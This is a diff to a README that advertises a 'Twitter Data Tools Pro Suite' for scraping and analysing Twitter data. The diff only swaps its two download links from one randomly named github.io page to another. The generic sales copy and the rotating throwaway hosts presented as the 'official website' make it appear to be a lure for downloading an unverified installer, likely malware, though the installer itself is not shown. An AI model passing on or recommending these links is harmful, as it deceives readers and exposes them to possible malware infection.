@@ -2,7 +2,7 @@
 
 The Twitter Data Tools Pro Suite is a powerful and comprehensive package designed for advanced data extraction and analysis from Twitter. This tool enables users to scrape tweets, analyze user profiles, and track hashtags with precision, making it an essential resource for researchers, marketers, social media managers, and data analysts. With its user-friendly interface and robust features, it simplifies the process of gathering and analyzing Twitter data for various purposes.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -76,6 +76,6 @@ A6: We offer email support for all users, with priority support for premium subs
 
 Ready to enhance your Twitter data analysis? Download the Twitter Data Tools Pro Suite now from our official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For the latest updates and news, follow our GitHub repository or visit our blog.
